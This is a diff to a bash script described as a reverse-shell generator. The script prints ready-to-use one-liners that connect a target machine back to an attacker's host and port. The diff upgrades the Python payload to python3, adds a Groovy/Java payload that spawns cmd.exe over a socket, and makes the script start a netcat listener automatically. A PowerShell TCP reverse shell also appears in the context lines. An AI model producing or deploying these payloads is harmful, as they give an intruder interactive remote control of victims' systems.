@@ -50,7 +50,7 @@ echo -e ""
 echo -e "${BLUE}"
 echo -e "Welcome to sh1n0bi's revshell generator!"
 echo -e "Select the type of revshell you want from this list..."
-echo -e "1=netcat; 1b=nc-win; 1c=nc-bsd; 2=bash; 3=perl; 4=python; 5=php; 6=ruby; 7=go; 8=lua; "
+echo -e "1=netcat; 1b=nc-win; 1c=nc-bsd; 2=bash; 3=perl; 4=python; 5=php; 6=ruby; 7=go; 8=lua 8a=groovy; "
 echo -e "Or some helpful powershell commands: 9=ps-revshell; 9a=iex (shell.ps1); 9b=iwr:"
 echo -e "${NC}"
 echo -e ""
@@ -62,7 +62,6 @@ echo -e "${NC}"
 #############################
 
 echo -e "${YELLOW}"
-echo -e "Don't forget to set a listener on $lport..." |cowsay
 echo -e "${NC}"
 
 if [ -z $langu ];then
@@ -112,7 +111,7 @@ case $langu in
 	 echo "$message" |base64 -w0;;
 
 	4)
-	 message="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+	 message="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 	 echo "$message"
 	 echo -e "${YELLOW}And URLencoded! ${NC}"
      urlencode "$message"
@@ -153,6 +152,11 @@ case $langu in
 	 echo "$mesage" |base64 -w0;;
 
 
+	8a)
+	message="String host=\"$lhost\";int port=$lport;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+	echo "$message"
+	echo -e "${YELLOW}You can break the onle liner down at the semi-colons if it doesnt work first time.";;
+
 
 	9)
 	 message="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
@@ -187,4 +191,10 @@ case $langu in
 	 exit
 
 esac
+
+echo ""
+echo ""
+echo -e "${BLUE}Starting the netcat listener now! ${NC}" |cowsay
+nc -nlvp $lport;
+
 
